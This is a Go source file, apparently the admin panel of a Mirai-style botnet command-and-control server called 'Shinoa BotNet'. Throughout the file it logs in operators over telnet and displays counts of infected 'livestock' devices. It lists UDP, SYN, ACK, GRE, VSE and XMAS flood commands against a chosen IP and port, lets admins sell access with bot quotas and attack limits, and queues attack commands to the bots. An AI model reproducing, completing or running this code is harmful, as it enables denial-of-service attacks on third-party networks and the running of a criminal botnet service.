package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()
    // Get username
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[1;35mユ\033[1;37mー\033[1;35mザ\033[1;37mー\033[1;35m名\033[1;36m: \033[0m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[1;35mパ\033[1;37mス\033[1;35mワ\033[1;37mー\033[1;35mド\033[1;36m: \033[0m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
    spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\033[37;1mチェックイン情報... \033[31m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(300) * time.Millisecond)
    }

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\x1b[1;37m[-]INVALAD LOGIN[-]\r\n"))
        this.conn.Write([]byte("\x1b[1;37m[-]press any key to exit[-]\033[0m"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    this.conn.Write([]byte("\r\n\033[0m"))
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;[%d] Livestocks Connected | Login as: [%s]\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
	this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\x1b[1;37m           ███████\x1b[1;35m╗\x1b[1;37m███████\x1b[1;35m╗\x1b[1;37m███\x1b[1;35m╗   \x1b[1;37m██\x1b[1;35m╗\x1b[1;37m██████\x1b[1;35m╗  \x1b[1;37m█████\x1b[1;35m╗ \x1b[1;37m██\x1b[1;35m╗\r\n\x1b[0m"))
    this.conn.Write([]byte("\x1b[1;37m           ██\x1b[1;35m╔════╝\x1b[1;37m██\x1b[1;35m╔════╝\x1b[1;37m████\x1b[1;35m╗  \x1b[1;37m██\x1b[1;35m║\x1b[1;37m██\x1b[1;35m╔══\x1b[1;37m██\x1b[1;35m╗\x1b[1;37m██\x1b[1;35m╔══\x1b[1;37m██\x1b[1;35m╗\x1b[1;37m██\x1b[1;35m║\r\n\x1b[0m"))
    this.conn.Write([]byte("\x1b[1;37m           ███████\x1b[1;35m╗\x1b[1;37m█████\x1b[1;35m╗  \x1b[1;37m██\x1b[1;35m╔\x1b[1;37m██\x1b[1;35m╗ \x1b[1;37m██\x1b[1;35m║\x1b[1;37m██████\x1b[1;35m╔╝\x1b[1;37m███████\x1b[1;35m║\x1b[1;37m██\x1b[1;35m║\r\n\x1b[0m"))
    this.conn.Write([]byte("\x1b[1;35m           ╚════\x1b[1;37m██\x1b[1;35m║\x1b[1;37m██\x1b[1;35m╔══╝  \x1b[1;37m██\x1b[1;35m║╚\x1b[1;37m██\x1b[1;35m╗\x1b[1;37m██\x1b[1;35m║\x1b[1;37m██\x1b[1;35m╔═══╝ \x1b[1;37m██\x1b[1;35m╔══\x1b[1;37m██\x1b[1;35m║\x1b[1;37m██\x1b[1;35m║\r\n\x1b[0m"))
    this.conn.Write([]byte("\x1b[1;37m           ███████\x1b[1;35m║\x1b[1;37m███████\x1b[1;35m╗\x1b[1;37m██\x1b[1;35m║ ╚\x1b[1;37m████\x1b[1;35m║\x1b[1;37m██\x1b[1;35m║     \x1b[1;37m██\x1b[1;35m║  \x1b[1;37m██\x1b[1;35m║\x1b[1;37m██\x1b[1;35m║\r\n\x1b[0m"))
    this.conn.Write([]byte("\x1b[1;35m           ╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝╚═╝\r\n\x1b[0m"))
	this.conn.Write([]byte("\x1b[1;36m              \x1b[1;35m[\x1b[1;37m+\x1b[1;35m]\x1b[1;37mようこそ\x1b[1;36m \033[32;1m" + username + " \x1b[1;37mTo The Shinoa BotNet\x1b[1;35m[\x1b[1;37m+\x1b[1;35m]\r\n\x1b[0m"))
	this.conn.Write([]byte("\x1b[1;36m               \x1b[1;35m[\x1b[1;37m+\x1b[1;35m]\x1b[1;37mヘルプを入力してヘルプを表示する\x1b[1;35m[\x1b[1;37m+\x1b[1;35m]\r\n\x1b[0m"))
    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\033[35;1m[\033[37;1m" + username + "\033[35;1m@\033[37;1mシノア\033[35;1m]\033[36;1m~# \033[0m"))
        cmd, err := this.ReadLine(false)
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        if cmd == "" {
            continue
        }
		if err != nil || cmd == "bootnoot" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[1;32m  ▄▄▄▄    ▒█████   ▒█████  ▄▄▄█████▓ ███▄    █  ▒█████   ▒█████  ▄▄▄█████▓\r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;32m ▓█████▄ ▒██▒  ██▒▒██▒  ██▒▓  ██▒ ▓▒ ██ ▀█   █ ▒██▒  ██▒▒██▒  ██▒▓  ██▒ ▓▒\r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;32m ▒██▒ ▄██▒██░  ██▒▒██░  ██▒▒ ▓██░ ▒░▓██  ▀█ ██▒▒██░  ██▒▒██░  ██▒▒ ▓██░ ▒░\r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;32m ▒██░█▀  ▒██   ██░▒██   ██░░ ▓██▓ ░ ▓██▒  ▐▌██▒▒██   ██░▒██   ██░░ ▓██▓ ░ \r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;32m ░▓█  ▀█▓░ ████▓▒░░ ████▓▒░  ▒██▒ ░ ▒██░   ▓██░░ ████▓▒░░ ████▓▒░  ▒██▒ ░ \r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;32m ░▒▓███▀▒░ ▒░▒░▒░ ░ ▒░▒░▒░   ▒ ░░   ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░▒░▒░   ▒ ░░   \r\n\x1b[0m"))
			this.conn.Write([]byte("\x1b[1;32m ▒░▒   ░   ░ ▒ ▒░   ░ ▒ ▒░     ░    ░ ░░   ░ ▒░  ░ ▒ ▒░   ░ ▒ ▒░     ░    \r\n\x1b[0m"))
			this.conn.Write([]byte("\x1b[1;32m  ░    ░ ░ ░ ░ ▒  ░ ░ ░ ▒    ░         ░   ░ ░ ░ ░ ░ ▒  ░ ░ ░ ▒    ░      \r\n\x1b[0m"))
			this.conn.Write([]byte("\x1b[1;32m  ░          ░ ░      ░ ░                    ░     ░ ░      ░ ░            \r\n\x1b[0m"))
			this.conn.Write([]byte("\x1b[1;36m                \x1b[1;35m[\x1b[1;37m+\x1b[1;35m]\x1b[1;37mようこそ\x1b[1;36m \033[32;1m" + username + " \x1b[1;37mTo The rice fields\x1b[1;35m[\x1b[1;37m+\x1b[1;35m]\r\n\x1b[0m"))
	        this.conn.Write([]byte("\x1b[1;36m                \x1b[1;35m[\x1b[1;37m+\x1b[1;35m]\x1b[1;37mヘルプを入力してヘルプを表示する\x1b[1;35m[\x1b[1;37m+\x1b[1;35m]\r\n\x1b[0m"))		
			continue
		}
		if err != nil || cmd == "senpaipink" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[1;35m           ███████\x1b[1;36m╗\x1b[1;35m███████\x1b[1;36m╗\x1b[1;35m███\x1b[1;36m╗   \x1b[1;35m██\x1b[1;36m╗\x1b[1;35m██████\x1b[1;36m╗  \x1b[1;35m█████\x1b[1;36m╗ \x1b[1;35m██\x1b[1;36m╗\r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;35m           ██\x1b[1;36m╔════╝\x1b[1;35m██\x1b[1;36m╔════╝\x1b[1;35m████\x1b[1;36m╗  \x1b[1;35m██\x1b[1;36m║\x1b[1;35m██\x1b[1;36m╔══\x1b[1;35m██\x1b[1;36m╗\x1b[1;35m██\x1b[1;36m╔══\x1b[1;35m██\x1b[1;36m╗\x1b[1;35m██\x1b[1;36m║\r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;35m           ███████\x1b[1;36m╗\x1b[1;35m█████\x1b[1;36m╗  \x1b[1;35m██\x1b[1;36m╔\x1b[1;35m██\x1b[1;36m╗ \x1b[1;35m██\x1b[1;36m║\x1b[1;35m██████\x1b[1;36m╔╝\x1b[1;35m███████\x1b[1;36m║\x1b[1;35m██\x1b[1;36m║\r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;36m           ╚════\x1b[1;35m██\x1b[1;36m║\x1b[1;35m██\x1b[1;36m╔══╝  \x1b[1;35m██\x1b[1;36m║╚\x1b[1;35m██\x1b[1;36m╗\x1b[1;35m██\x1b[1;36m║\x1b[1;35m██\x1b[1;36m╔═══╝ \x1b[1;35m██\x1b[1;36m╔══\x1b[1;35m██\x1b[1;36m║\x1b[1;35m██\x1b[1;36m║\r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;35m           ███████\x1b[1;36m║\x1b[1;35m███████\x1b[1;36m╗\x1b[1;35m██\x1b[1;36m║ ╚\x1b[1;35m████\x1b[1;36m║\x1b[1;35m██\x1b[1;36m║     \x1b[1;35m██\x1b[1;36m║  \x1b[1;35m██\x1b[1;36m║\x1b[1;35m██\x1b[1;36m║\r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;36m           ╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝╚═╝\r\n\x1b[0m"))
			this.conn.Write([]byte("\x1b[1;36m              \x1b[1;35m[\x1b[1;37m+\x1b[1;35m]\x1b[1;37mようこそ\x1b[1;36m \033[32;1m" + username + " \x1b[1;37mTo The Shinoa BotNet\x1b[1;35m[\x1b[1;37m+\x1b[1;35m]\r\n\x1b[0m"))
	        this.conn.Write([]byte("\x1b[1;36m               \x1b[1;35m[\x1b[1;37m+\x1b[1;35m]\x1b[1;37mヘルプを入力してヘルプを表示する\x1b[1;35m[\x1b[1;37m+\x1b[1;35m]\r\n\x1b[0m"))		
			continue
		}
        if err != nil || cmd == "HELP" || cmd == "help" || cmd == "?" {
			this.conn.Write([]byte("\x1b[1;35m[\x1b[1;37m+\x1b[1;35m]\x1b[1;36m---------------------------------------------------------\x1b[1;35m[\x1b[1;37m+\x1b[1;35m]\r\n"))
            this.conn.Write([]byte("\x1b[1;36m |\x1b[1;37m                   コマンドのメニュー                      \x1b[1;36m|\r\n"))
            this.conn.Write([]byte("\x1b[1;36m |\x1b[1;37m greip [ip] [time] dport=[port]            | greip         \x1b[1;36m|\r\n"))
            this.conn.Write([]byte("\x1b[1;36m |\x1b[1;37m lynx [ip] [time] dport=[port]             | lynx          \x1b[1;36m|\r\n"))
			this.conn.Write([]byte("\x1b[1;36m |\x1b[1;37m udpplain [ip] [time] dport=[port]         | udpplain      \x1b[1;36m|\r\n"))
            this.conn.Write([]byte("\x1b[1;36m |\x1b[1;37m ack [ip] [time] dport=[port]              | ack           \x1b[1;36m|\r\n"))
            this.conn.Write([]byte("\x1b[1;36m |\x1b[1;37m syn [ip] [time] dport=[port]              | syn           \x1b[1;36m|\r\n"))
            this.conn.Write([]byte("\x1b[1;36m |\x1b[1;37m vse [ip] [time] dport=[port]              | vse           \x1b[1;36m|\r\n"))
            this.conn.Write([]byte("\x1b[1;36m |\x1b[1;37m greeth [ip] [time] dport=[port]           | greeth        \x1b[1;36m|\r\n"))
			this.conn.Write([]byte("\x1b[1;36m |\x1b[1;37m xmas [ip] [time] dport=[port]             | xmas          \x1b[1;36m|\r\n"))
            this.conn.Write([]byte("\x1b[1;36m |\x1b[1;37m cls or clear                              | clears screen \x1b[1;36m|\r\n"))
            this.conn.Write([]byte("\x1b[1;35m[\x1b[1;37m+\x1b[1;35m]\x1b[1;36m---------------------------------------------------------\x1b[1;35m[\x1b[1;37m+\x1b[1;35m]\r\n"))
            continue
        }
		if err != nil || cmd == "clear" || cmd == "cls" {
    this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\x1b[1;37m           ███████\x1b[1;35m╗\x1b[1;37m███████\x1b[1;35m╗\x1b[1;37m███\x1b[1;35m╗   \x1b[1;37m██\x1b[1;35m╗\x1b[1;37m██████\x1b[1;35m╗  \x1b[1;37m█████\x1b[1;35m╗ \x1b[1;37m██\x1b[1;35m╗\r\n\x1b[0m"))
    this.conn.Write([]byte("\x1b[1;37m           ██\x1b[1;35m╔════╝\x1b[1;37m██\x1b[1;35m╔════╝\x1b[1;37m████\x1b[1;35m╗  \x1b[1;37m██\x1b[1;35m║\x1b[1;37m██\x1b[1;35m╔══\x1b[1;37m██\x1b[1;35m╗\x1b[1;37m██\x1b[1;35m╔══\x1b[1;37m██\x1b[1;35m╗\x1b[1;37m██\x1b[1;35m║\r\n\x1b[0m"))
    this.conn.Write([]byte("\x1b[1;37m           ███████\x1b[1;35m╗\x1b[1;37m█████\x1b[1;35m╗  \x1b[1;37m██\x1b[1;35m╔\x1b[1;37m██\x1b[1;35m╗ \x1b[1;37m██\x1b[1;35m║\x1b[1;37m██████\x1b[1;35m╔╝\x1b[1;37m███████\x1b[1;35m║\x1b[1;37m██\x1b[1;35m║\r\n\x1b[0m"))
    this.conn.Write([]byte("\x1b[1;35m           ╚════\x1b[1;37m██\x1b[1;35m║\x1b[1;37m██\x1b[1;35m╔══╝  \x1b[1;37m██\x1b[1;35m║╚\x1b[1;37m██\x1b[1;35m╗\x1b[1;37m██\x1b[1;35m║\x1b[1;37m██\x1b[1;35m╔═══╝ \x1b[1;37m██\x1b[1;35m╔══\x1b[1;37m██\x1b[1;35m║\x1b[1;37m██\x1b[1;35m║\r\n\x1b[0m"))
    this.conn.Write([]byte("\x1b[1;37m           ███████\x1b[1;35m║\x1b[1;37m███████\x1b[1;35m╗\x1b[1;37m██\x1b[1;35m║ ╚\x1b[1;37m████\x1b[1;35m║\x1b[1;37m██\x1b[1;35m║     \x1b[1;37m██\x1b[1;35m║  \x1b[1;37m██\x1b[1;35m║\x1b[1;37m██\x1b[1;35m║\r\n\x1b[0m"))
    this.conn.Write([]byte("\x1b[1;35m           ╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝╚═╝\r\n\x1b[0m"))
	this.conn.Write([]byte("\x1b[1;36m              \x1b[1;35m[\x1b[1;37m+\x1b[1;35m]\x1b[1;37mようこそ\x1b[1;36m \033[32;1m" + username + " \x1b[1;37mTo The Shinoa BotNet\x1b[1;35m[\x1b[1;37m+\x1b[1;35m]\r\n\x1b[0m"))
	this.conn.Write([]byte("\x1b[1;36m               \x1b[1;35m[\x1b[1;37m+\x1b[1;35m]\x1b[1;37mヘルプを入力してヘルプを表示する\x1b[1;35m[\x1b[1;37m+\x1b[1;35m]\r\n\x1b[0m"))		
			continue
		}
	
        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "adduser" {
            this.conn.Write([]byte("\x1b[1;37mEnter new username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;37mEnter new password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;37mEnter wanted bot count (-1 for full net): "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "\x1b[1;37mFailed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;37mMax attack duration (-1 for none): "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "\x1b[1;37mFailed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;37mCooldown time (0 for none): "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "\x1b[1;37mFailed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;37mNew account info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBots: " + max_bots_str + "\r\nContinue? (y/N)"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
            }
            continue
        }
        if userInfo.admin == 1 && cmd == "botcount" || userInfo.admin == 1 && cmd == "bots" || userInfo.admin == 1 && cmd == "count" {
		botCount = clientList.Count()
            m := clientList.Distribution()
			    this.conn.Write([]byte(fmt.Sprintf("\x1b[1;35m[\x1b[1;37m+\x1b[1;35m]----------------\x1b[1;35m[\x1b[1;37m+\x1b[1;35m]\r\n")))
				for k, v := range m{
				
                this.conn.Write([]byte(fmt.Sprintf("\033[1;35m%s:\t\033[1;31m[\033[1;36m%d\033[1;31m]\033[0m\r\n", k, v)))
				}
          
			this.conn.Write([]byte(fmt.Sprintf("\033[32;1mTOTAL: %d\r\n", botCount)))
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;35m[\x1b[1;37m+\x1b[1;35m]----------------\x1b[1;35m[\x1b[1;37m+\x1b[1;35m]\r\n")))
            continue
			
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mFailed to parse botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mBot count to send is bigger then allowed bot maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if userInfo.admin == 1 && cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
